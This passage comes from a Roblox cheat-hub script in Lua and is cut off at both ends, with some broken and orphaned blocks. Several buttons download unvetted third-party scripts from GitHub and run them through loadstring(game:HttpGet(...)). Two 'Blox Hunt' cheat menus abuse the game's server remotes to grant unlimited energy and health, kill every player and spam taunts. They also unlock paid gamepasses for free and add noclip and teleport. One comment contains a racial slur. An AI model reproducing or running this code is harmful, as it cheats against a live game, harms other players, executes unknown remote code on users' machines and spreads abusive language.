	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Simple-Hub-X-Gear-SSX.lua/main/Gear%20SSX%20X%20Simple%20Hub"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Scriptonite Beta X",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/EpicSwords1982/Scriptonite-Hub2/main/Scriptonite%20not%20loadstring"))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Legends Hub",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Legends-Hub-V2/main/Legends%20Hub%20V2"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Sorix Hub",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/JunBloxYTPlayz/SORIX-Hub/main/SORIX%20Hub%20Mm2"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Meow Hub",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/VikiChardd/Bb-script/main/Meow%20Source%20Hub"))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Top X V2",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Top-X-V2/main/Top%20X%20V2%20By%20GearV4"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Animation FE",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/FE-Animation/main/Fe%20Animation"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
      		print("button pressed")
  	end    
})

local Tab23 = Window:MakeTab({
	Name = "Blox Hunt",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab23:AddButton({
	Name = "Blox Hunt GUI",
	Callback = function()
	 -- Insert your loading screen GUI here
local loadingScreen = Instance.new("ScreenGui")
loadingScreen.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0) -- Fill the entire screen
background.BackgroundColor3 = Color3.new(0, 0, 0) -- Black background
background.Parent = loadingScreen

local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(0.5, 0, 0.2, 0) -- Size of the text box
loadingText.Position = UDim2.new(0.25, 0, 0.4, 0) -- Position of the text box
loadingText.BackgroundColor3 = Color3.new(1, 1, 1) -- White background
loadingText.TextColor3 = Color3.new(0, 0, 0) -- Black text color
loadingText.TextSize = 24
loadingText.Font = Enum.Font.SourceSans
loadingText.Text = "Loading Assets"
loadingText.Parent = background

-- Function to add a dot to the loading text
local function addDot()
    loadingText.Text = loadingText.Text .. "."
end

-- Loop to simulate loading progress
for i = 1, 100 do
    if i % 3 == 0 then
        addDot()
    end
    loadingText.Text = "Loading Assets: " .. i .. "%"
    wait(0.1) -- Adjust the wait time as needed
end

-- Display "Script successfully loaded" message
loadingText.Text = "Script successfully loaded"

-- Destroy loading screen after loading is complete
wait(2) -- Wait for 2 seconds before destroying
loadingScreen:Destroy()
-- Made by GearV4|Credits: Just GearV4 i own this shitty script nigga 
-- Version: 2.0
-- Instances:
local ScreenGui = Instance.new("ScreenGui")
local open = Instance.new("Frame")
local ob = Instance.new("TextButton")
local main = Instance.new("Frame")
local name = Instance.new("TextLabel")
local made = Instance.new("TextLabel")
local money = Instance.new("TextButton")
local energy = Instance.new("TextButton")
local hider = Instance.new("TextButton")
local X = Instance.new("TextButton")
local afkon = Instance.new("TextButton")
local taunt = Instance.new("TextButton")
local health = Instance.new("TextButton")
local kill = Instance.new("TextButton")
local gamepasson = Instance.new("TextButton")
local ws = Instance.new("TextButton")
local number = Instance.new("TextBox")
local tele = Instance.new("TextButton")
local username = Instance.new("TextBox")
local noclipon = Instance.new("TextButton")
local noclipoff = Instance.new("TextButton")
local gamepassoff = Instance.new("TextButton")
local afkoff = Instance.new("TextButton")
local credits = Instance.new("TextLabel")
--Properties:
ScreenGui.Parent = game.CoreGui
open.Name = "open"
open.Parent = ScreenGui
open.BackgroundColor3 = Color3.new(102, 51, 153)
open.BorderSizePixel = 3
open.Position = UDim2.new(0, 0, 0.474766344, 0)
open.Size = UDim2.new(0, 81, 0, 20)

ob.Name = "ob"
ob.Parent = open
ob.BackgroundColor3 = Color3.new(102, 51, 153)
ob.BorderColor3 = Color3.new(1, 1, 1)
ob.BorderSizePixel = 0
ob.Size = UDim2.new(0, 81, 0, 20)
ob.Font = Enum.Font.Fantasy
ob.Text = "OPEN"
ob.TextColor3 = Color3.new(0, 0, 0)
ob.TextSize = 14
ob.MouseButton1Down:connect(function()
	main.Visible = true
	open.Visible = false
end)

main.Name = "main"
main.Parent = ScreenGui
main.BackgroundColor3 = Color3.new(102, 51, 153)
main.BorderColor3 = Color3.new(1, 1, 1)
main.BorderSizePixel = 5
main.Position = UDim2.new(0.25629124, 0, 0.138317764, 0)
main.Size = UDim2.new(0, 324, 0, 386)
main.Visible = false
main.Active = true
main.Draggable = true

name.Name = "name"
name.Parent = main
name.BackgroundColor3 = Color3.new(102, 51, 153)
name.BorderColor3 = Color3.new(1, 1, 1)
name.BorderSizePixel = 3
name.Position = UDim2.new(0.000210219994, 0, 0, 0)
name.Size = UDim2.new(0, 323, 0, 24)
name.Font = Enum.Font.Cartoon
name.Text = "BloxHunt GUI"
name.TextColor3 = Color3.new(0, 0, 0)
name.TextSize = 19

made.Name = "made"
made.Parent = main
made.BackgroundColor3 = Color3.new(102, 51, 153)
made.BorderColor3 = Color3.new(1, 1, 1)
made.BorderSizePixel = 3
made.Position = UDim2.new(0.592482567, 0, 0.937165141, 0)
made.Size = UDim2.new(0, 131, 0, 24)
made.Font = Enum.Font.Cartoon
made.Text = "Made by Cataclysm#1443"
made.TextColor3 = Color3.new(0, 0, 0)
made.TextSize = 14

money.Name = "money"
money.Parent = main
money.BackgroundColor3 = Color3.new(102, 51, 153)
money.BorderColor3 = Color3.new(1, 1, 1)
money.BorderSizePixel = 2
money.Position = UDim2.new(0, 0, 0.100487396, 0)
money.Size = UDim2.new(0, 91, 0, 32)
money.Font = Enum.Font.Fantasy
money.Text = "Money"
money.TextColor3 = Color3.new(0, 0, 0)
money.TextSize = 14
money.MouseButton1Down:connect(function()
	local coin = workspace.Lobby.LobbyObby.Token
coin.CanCollide = false
for i = 1,50,1 do
wait()
coin.CFrame = (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
end
coin.CanCollide = true
end)

energy.Name = "energy"
energy.Parent = main
energy.BackgroundColor3 = Color3.new(102, 51, 153)
energy.BorderColor3 = Color3.new(1, 1, 1)
energy.BorderSizePixel = 2
energy.Position = UDim2.new(0.358024687, 0, 0.231908411, 0)
energy.Size = UDim2.new(0, 91, 0, 32)
energy.Font = Enum.Font.Fantasy
energy.Text = "Unlim Energy"
energy.TextColor3 = Color3.new(0, 0, 0)
energy.TextSize = 14
energy.MouseButton1Down:connect(function()
	game.ReplicatedStorage.GameFunctions.StatChange:FireServer("Energy", 10000)
end)

hider.Name = "hider"
hider.Parent = main
hider.BackgroundColor3 = Color3.new(102, 51, 153)
hider.BorderColor3 = Color3.new(1, 1, 1)
hider.BorderSizePixel = 2
hider.Position = UDim2.new(0, 0, 0.232732117, 0)
hider.Size = UDim2.new(0, 91, 0, 32)
hider.Font = Enum.Font.Fantasy
hider.Text = "View Hider"
hider.TextColor3 = Color3.new(0, 0, 0)
hider.TextSize = 14
hider.MouseButton1Click:Connect(function()
	players = game:GetService("Players")
while wait(1) do
for i, v in pairs(players:GetChildren()) do
if v.Name ~= players.LocalPlayer.Name then
if v.Character and v.Character:FindFirstChild("Object") then
for j, k in pairs(v.Character.Object:GetChildren()) do
if k:IsA("Part") then
k.BrickColor = BrickColor.new("Hot pink")
end
end
end
end
end
end
end)

X.Name = "X"
X.Parent = main
X.BackgroundColor3 = Color3.new(102, 51, 153)
X.BorderColor3 = Color3.new(1, 1, 1)
X.BorderSizePixel = 2
X.Position = UDim2.new(0.929168344, 0, 0, 0)
X.Size = UDim2.new(0, 22, 0, 24)
X.Font = Enum.Font.Fantasy
X.Text = "X"
X.TextColor3 = Color3.new(0, 0, 0)
X.TextSize = 14
X.MouseButton1Down:connect(function()
	open.Visible = true
	main.Visible = false
end)

afkon.Name = "afkon"
afkon.Parent = main
afkon.BackgroundColor3 = Color3.new(102, 51, 153)
afkon.BorderColor3 = Color3.new(1, 1, 1)
afkon.BorderSizePixel = 2
afkon.Position = UDim2.new(0, 0, 0.357164294, 0)
afkon.Size = UDim2.new(0, 91, 0, 32)
afkon.Visible = false
afkon.Font = Enum.Font.Fantasy
afkon.Text = "AFK: ON"
afkon.TextColor3 = Color3.new(0, 0, 0)
afkon.TextSize = 14
afkon.MouseButton1Down:connect(function()
	game.Players.LocalPlayer.Information.AFK.Value = false
	afkoff.Visible = true
	afkon.Visible = false
end)

taunt.Name = "taunt"
taunt.Parent = main
taunt.BackgroundColor3 = Color3.new(102, 51, 153)
taunt.BorderColor3 = Color3.new(1, 1, 1)
taunt.BorderSizePixel = 2
taunt.Position = UDim2.new(0.358884186, 0, 0.100687623, 0)
taunt.Size = UDim2.new(0, 91, 0, 32)
taunt.Font = Enum.Font.Fantasy
taunt.Text = "Spam Taunt"
taunt.TextColor3 = Color3.new(0, 0, 0)
taunt.TextSize = 14
taunt.MouseButton1Click:Connect(function()
	while true do
game.ReplicatedStorage.GameFunctions.Taunt:FireServer()
wait()
game.ReplicatedStorage.GameFunctions.Taunt:FireServer()
wait()
game.ReplicatedStorage.GameFunctions.Taunt:FireServer()
wait()
game.ReplicatedStorage.GameFunctions.Taunt:FireServer()
wait()
game.ReplicatedStorage.GameFunctions.Taunt:FireServer()
wait()
end
end)

health.Name = "health"
health.Parent = main
health.BackgroundColor3 = Color3.new(102, 51, 153)
health.BorderColor3 = Color3.new(1, 1, 1)
health.BorderSizePixel = 2
health.Position = UDim2.new(0.719135821, 0, 0.230021074, 0)
health.Size = UDim2.new(0, 91, 0, 32)
health.Font = Enum.Font.Fantasy
health.Text = "Unlim Health"
health.TextColor3 = Color3.new(0, 0, 0)
health.TextSize = 14
health.MouseButton1Down:connect(function()
	game.ReplicatedStorage.GameFunctions.StatChange:FireServer("Health", 10000)
end)

kill.Name = "kill"
kill.Parent = main
kill.BackgroundColor3 = Color3.new(102, 51, 153)
kill.BorderColor3 = Color3.new(1, 1, 1)
kill.BorderSizePixel = 2
kill.Position = UDim2.new(0.719135821, 0, 0.100487396, 0)
kill.Size = UDim2.new(0, 91, 0, 32)
kill.Font = Enum.Font.Fantasy
kill.Text = "Autokill"
kill.TextColor3 = Color3.new(0, 0, 0)
kill.TextSize = 14
kill.MouseButton1Down:connect(function()
	local shock  = game.ReplicatedStorage.GameFunctions.Shock
local refill = game.ReplicatedStorage.GameFunctions.StatChange

for _, v in pairs(game.Players:GetPlayers()) do
if v.Character and v.Character:FindFirstChild'Object' then
for i=1, 3 do
shock:FireServer("Hit", v.Character)
for i=1, 2 do
refill:FireServer("Energy", 2)
end
end
end
end
end)

gamepasson.Name = "gamepasson"
gamepasson.Parent = main
gamepasson.BackgroundColor3 = Color3.new(102, 51, 153)
gamepasson.BorderColor3 = Color3.new(1, 1, 1)
gamepasson.BorderSizePixel = 2
gamepasson.Position = UDim2.new(0.358024687, 0, 0.357164294, 0)
gamepasson.Size = UDim2.new(0, 91, 0, 32)
gamepasson.Visible = false
gamepasson.Font = Enum.Font.Fantasy
gamepasson.Text = "Gamepass: ON"
gamepasson.TextColor3 = Color3.new(0, 0, 0)
gamepasson.TextSize = 14
gamepasson.MouseButton1Down:connect(function()
	game.Players.LocalPlayer.Information.Gamepasses.FaceChanger.Value = false
game.Players.LocalPlayer.Information.Gamepasses.Vanish.Value = false
game.Players.LocalPlayer.Information.Gamepasses.Cloner.Value = false
game.Players.LocalPlayer.Information.Gamepasses.InstantHide.Value = false
game.Players.LocalPlayer.Information.Gamepasses.Radar.Value = false
game.Players.LocalPlayer.Information.Gamepasses.Walkspeed.Value = false
game.Players.LocalPlayer.Information.Gamepasses.AutoSeeker.Value = false
game.Players.LocalPlayer.Information.Gamepasses.SeekerPoints.Value = false
gamepassoff.Visible = true
gamepasson.Visible = false
end)

ws.Name = "ws"
ws.Parent = main
ws.BackgroundColor3 = Color3.new(102, 51, 153)
ws.BorderColor3 = Color3.new(1, 1, 1)
ws.BorderSizePixel = 2
ws.Position = UDim2.new(0, 0, 0.618822336, 0)
ws.Size = UDim2.new(0, 135, 0, 32)
ws.Font = Enum.Font.Fantasy
ws.Text = "Set WalkSpeed"
ws.TextColor3 = Color3.new(0, 0, 0)
ws.TextSize = 12
ws.MouseButton1Down:connect(function()
	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (number.Text) --What the walkspeed is as you click [SHIFT]
end)

number.Name = "number"
number.Parent = ws
number.BackgroundColor3 = Color3.new(102, 51, 153)
number.BorderColor3 = Color3.new(1, 1, 1)
number.BorderSizePixel = 2
number.Position = UDim2.new(0, 0, -1.4375, 0)
number.Size = UDim2.new(0, 135, 0, 37)
number.Font = Enum.Font.SourceSans
number.Text = "Number"
number.TextColor3 = Color3.new(0, 0, 0)
number.TextSize = 14

tele.Name = "tele"
tele.Parent = main
tele.BackgroundColor3 = Color3.new(102, 51, 153)
tele.BorderColor3 = Color3.new(1, 1, 1)
tele.BorderSizePixel = 2
tele.Position = UDim2.new(0.583333433, 0, 0.618822336, 0)
tele.Size = UDim2.new(0, 135, 0, 32)
tele.Font = Enum.Font.Fantasy
tele.Text = "Teleport"
tele.TextColor3 = Color3.new(0, 0, 0)
tele.TextSize = 14
tele.MouseButton1Click:Connect(function()
		getplr = function(plxr)
	for i, v in pairs(game.Players:GetPlayers()) do
		if string.find(v.Name, plxr) then
			return v
		elseif v.Name:sub(1, plxr:len()):lower()== plxr:lower() then
			return v
		end
	end
end
local plr = getplr(username.Text)
	game.Players.LocalPlayer.Character:MoveTo(plr.Character.Torso.Position)
end)

username.Name = "username"
username.Parent = tele
username.BackgroundColor3 = Color3.new(102, 51, 153)
username.BorderColor3 = Color3.new(1, 1, 1)
username.BorderSizePixel = 2
username.Position = UDim2.new(0, 0, -1.4375, 0)
username.Size = UDim2.new(0, 135, 0, 37)
username.Font = Enum.Font.SourceSans
username.Text = "Username"
username.TextColor3 = Color3.new(0, 0, 0)
username.TextSize = 14

noclipon.Name = "noclipon"
noclipon.Parent = main
noclipon.BackgroundColor3 = Color3.new(102, 51, 153)
noclipon.BorderColor3 = Color3.new(1, 1, 1)
noclipon.BorderSizePixel = 2
noclipon.Position = UDim2.new(0.719135821, 0, 0.356964082, 0)
noclipon.Size = UDim2.new(0, 91, 0, 32)
noclipon.Visible = false
noclipon.Font = Enum.Font.Fantasy
noclipon.Text = "Noclip: ON"
noclipon.TextColor3 = Color3.new(0, 0, 0)
noclipon.TextSize = 14
noclipon.MouseButton1Click:Connect(function()
	noclipoff.Visible = true
	noclipon.Visible = false
	local noclip = true char = game.Players.LocalPlayer.Character while true do if noclip == true then for _,v in pairs(char:children()) do pcall(function() if v.className == "Part" then v.CanCollide = true elseif v.ClassName == "Model" then v.Head.CanCollide = true end end) end end game:service("RunService").Stepped:wait() end
end)

noclipoff.Name = "noclipoff"
noclipoff.Parent = main
noclipoff.BackgroundColor3 = Color3.new(255, 0, 0)
noclipoff.BorderColor3 = Color3.new(1, 1, 1)
noclipoff.BorderSizePixel = 2
noclipoff.Position = UDim2.new(0.719135821, 0, 0.356964082, 0)
noclipoff.Size = UDim2.new(0, 91, 0, 32)
noclipoff.Font = Enum.Font.Fantasy
noclipoff.Text = "Noclip: OFF"
noclipoff.TextColor3 = Color3.new(0, 0, 0)
noclipoff.TextSize = 14
noclipoff.MouseButton1Click:Connect(function()
	noclipon.Visible = true
	noclipoff.Visible = false
	local noclip = true char = game.Players.LocalPlayer.Character while true do if noclip == true then for _,v in pairs(char:children()) do pcall(function() if v.className == "Part" then v.CanCollide = false elseif v.ClassName == "Model" then v.Head.CanCollide = false end end) end end game:service("RunService").Stepped:wait() end
end)

gamepassoff.Name = "gamepassoff"
gamepassoff.Parent = main
gamepassoff.BackgroundColor3 = Color3.new(255, 0, 0)
gamepassoff.BorderColor3 = Color3.new(1, 1, 1)
gamepassoff.BorderSizePixel = 2
gamepassoff.Position = UDim2.new(0.358024687, 0, 0.357164294, 0)
gamepassoff.Size = UDim2.new(0, 91, 0, 32)
gamepassoff.Font = Enum.Font.Fantasy
gamepassoff.Text = "Gamepass: OFF"
gamepassoff.TextColor3 = Color3.new(0, 0, 0)
gamepassoff.TextSize = 14
gamepassoff.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Information.Gamepasses.FaceChanger.Value = true
game.Players.LocalPlayer.Information.Gamepasses.Vanish.Value = true
game.Players.LocalPlayer.Information.Gamepasses.Cloner.Value = true
game.Players.LocalPlayer.Information.Gamepasses.InstantHide.Value = true
game.Players.LocalPlayer.Information.Gamepasses.Radar.Value = true
game.Players.LocalPlayer.Information.Gamepasses.Walkspeed.Value = true
game.Players.LocalPlayer.Information.Gamepasses.AutoSeeker.Value = true
game.Players.LocalPlayer.Information.Gamepasses.SeekerPoints.Value = true
gamepasson.Visible = true
gamepassoff.Visible = false
end)

afkoff.Name = "afkoff"
afkoff.Parent = main
afkoff.BackgroundColor3 = Color3.new(255, 0, 0)
afkoff.BorderColor3 = Color3.new(1, 1, 1)
afkoff.BorderSizePixel = 2
afkoff.Position = UDim2.new(0, 0, 0.357164294, 0)
afkoff.Size = UDim2.new(0, 91, 0, 32)
afkoff.Font = Enum.Font.Fantasy
afkoff.Text = "AFK: OFF"
afkoff.TextColor3 = Color3.new(0, 0, 0)
afkoff.TextSize = 14
afkoff.MouseButton1Click:connect(function()
	game.Players.LocalPlayer.Information.AFK.Value = true
	afkon.Visible = true
	afkoff.Visible = false
end)

credits.Name = "credits"
credits.Parent = main
credits.BackgroundColor3 = Color3.new(102, 51, 153)
credits.BorderColor3 = Color3.new(1, 1, 1)
credits.BorderSizePixel = 3
credits.Position = UDim2.new(-0.000110002235, 0, 0.937165141, 0)
credits.Size = UDim2.new(0, 131, 0, 24)
credits.Font = Enum.Font.Cartoon
credits.Text = "Credits: GearV4"
credits.TextColor3 = Color3.new(0, 0, 0)
credits.TextSize = 14 
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab23:AddButton({
	Name = "Blox Hunt GUI 2",
	Callback = function()
	  -- Made by Vugam#0025|Credits: Psykek.
-- Version: 1.1
-- UPDATED 5th Nov.
-- Instances:
local ScreenGui = Instance.new("ScreenGui")
local open = Instance.new("Frame")
local ob = Instance.new("TextButton")
local main = Instance.new("Frame")
local name = Instance.new("TextLabel")
local made = Instance.new("TextLabel")
local money = Instance.new("TextButton")
local energy = Instance.new("TextButton")
local hider = Instance.new("TextButton")
local X = Instance.new("TextButton")
local afkon = Instance.new("TextButton")
local taunt = Instance.new("TextButton")
local health = Instance.new("TextButton")
local kill = Instance.new("TextButton")
local gamepasson = Instance.new("TextButton")
local ws = Instance.new("TextButton")
local number = Instance.new("TextBox")
local tele = Instance.new("TextButton")
local username = Instance.new("TextBox")
local noclipon = Instance.new("TextButton")
local noclipoff = Instance.new("TextButton")
local gamepassoff = Instance.new("TextButton")
local afkoff = Instance.new("TextButton")
local credits = Instance.new("TextLabel")
--Properties:
ScreenGui.Parent = game.CoreGui

open.Name = "open"
open.Parent = ScreenGui
open.BackgroundColor3 = Color3.new(0, 1, 0.164706)
open.BorderColor3 = Color3.new(1, 1, 1)
open.BorderSizePixel = 3
open.Position = UDim2.new(0, 0, 0.474766344, 0)
open.Size = UDim2.new(0, 81, 0, 20)

ob.Name = "ob"
ob.Parent = open
ob.BackgroundColor3 = Color3.new(0, 1, 0.164706)
ob.BorderColor3 = Color3.new(1, 1, 1)
ob.BorderSizePixel = 0
ob.Size = UDim2.new(0, 81, 0, 20)
ob.Font = Enum.Font.Fantasy
ob.Text = "OPEN"
ob.TextColor3 = Color3.new(0, 0, 0)
ob.TextSize = 14
ob.MouseButton1Down:connect(function()
	main.Visible = true
	open.Visible = false
end)

main.Name = "main"
main.Parent = ScreenGui
main.BackgroundColor3 = Color3.new(0, 1, 0.164706)
main.BorderColor3 = Color3.new(1, 1, 1)
main.BorderSizePixel = 5
main.Position = UDim2.new(0.25629124, 0, 0.138317764, 0)
main.Size = UDim2.new(0, 324, 0, 386)
main.Visible = false
main.Active = true
main.Draggable = true

name.Name = "name"
name.Parent = main
name.BackgroundColor3 = Color3.new(0, 1, 0.164706)
name.BorderColor3 = Color3.new(1, 1, 1)
name.BorderSizePixel = 3
name.Position = UDim2.new(0.000210219994, 0, 0, 0)
name.Size = UDim2.new(0, 323, 0, 24)
name.Font = Enum.Font.Cartoon
name.Text = "BloxHunt GUI"
name.TextColor3 = Color3.new(0, 0, 0)
name.TextSize = 19

made.Name = "made"
made.Parent = main
made.BackgroundColor3 = Color3.new(0, 1, 0.164706)
made.BorderColor3 = Color3.new(1, 1, 1)
made.BorderSizePixel = 3
made.Position = UDim2.new(0.592482567, 0, 0.937165141, 0)
made.Size = UDim2.new(0, 131, 0, 24)
made.Font = Enum.Font.Cartoon
made.Text = "Made by Vugam#0025"
made.TextColor3 = Color3.new(0, 0, 0)
made.TextSize = 14

money.Name = "money"
money.Parent = main
money.BackgroundColor3 = Color3.new(0, 1, 0.164706)
money.BorderColor3 = Color3.new(1, 1, 1)
money.BorderSizePixel = 2
money.Position = UDim2.new(0, 0, 0.100487396, 0)
money.Size = UDim2.new(0, 91, 0, 32)
money.Font = Enum.Font.Fantasy
money.Text = "Money"
money.TextColor3 = Color3.new(0, 0, 0)
money.TextSize = 14
money.MouseButton1Down:connect(function()
	local coin = workspace.Lobby.LobbyObby.Token
coin.CanCollide = false
for i = 1,50,1 do
wait()
coin.CFrame = (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
end
coin.CanCollide = true
end)

energy.Name = "energy"
energy.Parent = main
energy.BackgroundColor3 = Color3.new(0, 1, 0.164706)
energy.BorderColor3 = Color3.new(1, 1, 1)
energy.BorderSizePixel = 2
energy.Position = UDim2.new(0.358024687, 0, 0.231908411, 0)
energy.Size = UDim2.new(0, 91, 0, 32)
energy.Font = Enum.Font.Fantasy
energy.Text = "Unlim Energy"
energy.TextColor3 = Color3.new(0, 0, 0)
energy.TextSize = 14
energy.MouseButton1Down:connect(function()
	game.ReplicatedStorage.GameFunctions.StatChange:FireServer("Energy", 10000)
end)

hider.Name = "hider"
hider.Parent = main
hider.BackgroundColor3 = Color3.new(0, 1, 0.164706)
hider.BorderColor3 = Color3.new(1, 1, 1)
hider.BorderSizePixel = 2
hider.Position = UDim2.new(0, 0, 0.232732117, 0)
hider.Size = UDim2.new(0, 91, 0, 32)
hider.Font = Enum.Font.Fantasy
hider.Text = "View Hider"
hider.TextColor3 = Color3.new(0, 0, 0)
hider.TextSize = 14
hider.MouseButton1Click:Connect(function()
	players = game:GetService("Players")
while wait(1) do
for i, v in pairs(players:GetChildren()) do
if v.Name ~= players.LocalPlayer.Name then
if v.Character and v.Character:FindFirstChild("Object") then
for j, k in pairs(v.Character.Object:GetChildren()) do
if k:IsA("Part") then
k.BrickColor = BrickColor.new("Hot pink")
end
end
end
end
end
end
end)

X.Name = "X"
X.Parent = main
X.BackgroundColor3 = Color3.new(0, 1, 0.164706)
X.BorderColor3 = Color3.new(1, 1, 1)
X.BorderSizePixel = 2
X.Position = UDim2.new(0.929168344, 0, 0, 0)
X.Size = UDim2.new(0, 22, 0, 24)
X.Font = Enum.Font.Fantasy
X.Text = "X"
X.TextColor3 = Color3.new(0, 0, 0)
X.TextSize = 14
X.MouseButton1Down:connect(function()
	open.Visible = true
	main.Visible = false
end)

afkon.Name = "afkon"
afkon.Parent = main
afkon.BackgroundColor3 = Color3.new(0, 1, 0.164706)
afkon.BorderColor3 = Color3.new(1, 1, 1)
afkon.BorderSizePixel = 2
afkon.Position = UDim2.new(0, 0, 0.357164294, 0)
afkon.Size = UDim2.new(0, 91, 0, 32)
afkon.Visible = false
afkon.Font = Enum.Font.Fantasy
afkon.Text = "AFK: ON"
afkon.TextColor3 = Color3.new(0, 0, 0)
afkon.TextSize = 14
afkon.MouseButton1Down:connect(function()
	game.Players.LocalPlayer.Information.AFK.Value = false
	afkoff.Visible = true
	afkon.Visible = false
end)

taunt.Name = "taunt"
taunt.Parent = main
taunt.BackgroundColor3 = Color3.new(0, 1, 0.164706)
taunt.BorderColor3 = Color3.new(1, 1, 1)
taunt.BorderSizePixel = 2
taunt.Position = UDim2.new(0.358884186, 0, 0.100687623, 0)
taunt.Size = UDim2.new(0, 91, 0, 32)
taunt.Font = Enum.Font.Fantasy
taunt.Text = "Spam Taunt"
taunt.TextColor3 = Color3.new(0, 0, 0)
taunt.TextSize = 14
taunt.MouseButton1Click:Connect(function()
	while true do
game.ReplicatedStorage.GameFunctions.Taunt:FireServer()
wait()
game.ReplicatedStorage.GameFunctions.Taunt:FireServer()
wait()
game.ReplicatedStorage.GameFunctions.Taunt:FireServer()
wait()
game.ReplicatedStorage.GameFunctions.Taunt:FireServer()
wait()
game.ReplicatedStorage.GameFunctions.Taunt:FireServer()
wait()
end
end)

health.Name = "health"
health.Parent = main
health.BackgroundColor3 = Color3.new(0, 1, 0.164706)
health.BorderColor3 = Color3.new(1, 1, 1)
health.BorderSizePixel = 2
health.Position = UDim2.new(0.719135821, 0, 0.230021074, 0)
health.Size = UDim2.new(0, 91, 0, 32)
health.Font = Enum.Font.Fantasy
health.Text = "Unlim Health"
health.TextColor3 = Color3.new(0, 0, 0)
health.TextSize = 14
health.MouseButton1Down:connect(function()
	game.ReplicatedStorage.GameFunctions.StatChange:FireServer("Health", 10000)
end)

kill.Name = "kill"
kill.Parent = main
kill.BackgroundColor3 = Color3.new(0, 1, 0.164706)
kill.BorderColor3 = Color3.new(1, 1, 1)
kill.BorderSizePixel = 2
kill.Position = UDim2.new(0.719135821, 0, 0.100487396, 0)
kill.Size = UDim2.new(0, 91, 0, 32)
kill.Font = Enum.Font.Fantasy
kill.Text = "Autokill"
kill.TextColor3 = Color3.new(0, 0, 0)
kill.TextSize = 14
kill.MouseButton1Down:connect(function()
	local shock  = game.ReplicatedStorage.GameFunctions.Shock
local refill = game.ReplicatedStorage.GameFunctions.StatChange

for _, v in pairs(game.Players:GetPlayers()) do
if v.Character and v.Character:FindFirstChild'Object' then
for i=1, 3 do
shock:FireServer("Hit", v.Character)
for i=1, 2 do
refill:FireServer("Energy", 2)
end
end
end
end
end)

gamepasson.Name = "gamepasson"
gamepasson.Parent = main
gamepasson.BackgroundColor3 = Color3.new(0, 1, 0.164706)
gamepasson.BorderColor3 = Color3.new(1, 1, 1)
gamepasson.BorderSizePixel = 2
gamepasson.Position = UDim2.new(0.358024687, 0, 0.357164294, 0)
gamepasson.Size = UDim2.new(0, 91, 0, 32)
gamepasson.Visible = false
gamepasson.Font = Enum.Font.Fantasy
gamepasson.Text = "Gamepass: ON"
gamepasson.TextColor3 = Color3.new(0, 0, 0)
gamepasson.TextSize = 14
gamepasson.MouseButton1Down:connect(function()
	game.Players.LocalPlayer.Information.Gamepasses.FaceChanger.Value = false
game.Players.LocalPlayer.Information.Gamepasses.Vanish.Value = false
game.Players.LocalPlayer.Information.Gamepasses.Cloner.Value = false
game.Players.LocalPlayer.Information.Gamepasses.InstantHide.Value = false
game.Players.LocalPlayer.Information.Gamepasses.Radar.Value = false
game.Players.LocalPlayer.Information.Gamepasses.Walkspeed.Value = false
game.Players.LocalPlayer.Information.Gamepasses.AutoSeeker.Value = false
game.Players.LocalPlayer.Information.Gamepasses.SeekerPoints.Value = false
gamepassoff.Visible = true
gamepasson.Visible = false
end)

ws.Name = "ws"
ws.Parent = main
ws.BackgroundColor3 = Color3.new(0, 1, 0.164706)
ws.BorderColor3 = Color3.new(1, 1, 1)
ws.BorderSizePixel = 2
ws.Position = UDim2.new(0, 0, 0.618822336, 0)
ws.Size = UDim2.new(0, 135, 0, 32)
ws.Font = Enum.Font.Fantasy
ws.Text = "Set WS"
ws.TextColor3 = Color3.new(0, 0, 0)
ws.TextSize = 12
ws.MouseButton1Down:connect(function()
	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (number.Text) --What the walkspeed is as you click [SHIFT]
end)

number.Name = "number"
number.Parent = ws
number.BackgroundColor3 = Color3.new(0, 1, 0.164706)
number.BorderColor3 = Color3.new(1, 1, 1)
number.BorderSizePixel = 2
number.Position = UDim2.new(0, 0, -1.4375, 0)
number.Size = UDim2.new(0, 135, 0, 37)
number.Font = Enum.Font.SourceSans
number.Text = "Number"
number.TextColor3 = Color3.new(0, 0, 0)
number.TextSize = 14

tele.Name = "tele"
tele.Parent = main
tele.BackgroundColor3 = Color3.new(0, 1, 0.164706)
tele.BorderColor3 = Color3.new(1, 1, 1)
tele.BorderSizePixel = 2
tele.Position = UDim2.new(0.583333433, 0, 0.618822336, 0)
tele.Size = UDim2.new(0, 135, 0, 32)
tele.Font = Enum.Font.Fantasy
tele.Text = "Teleport"
tele.TextColor3 = Color3.new(0, 0, 0)
tele.TextSize = 14
tele.MouseButton1Click:Connect(function()
		getplr = function(plxr)
	for i, v in pairs(game.Players:GetPlayers()) do
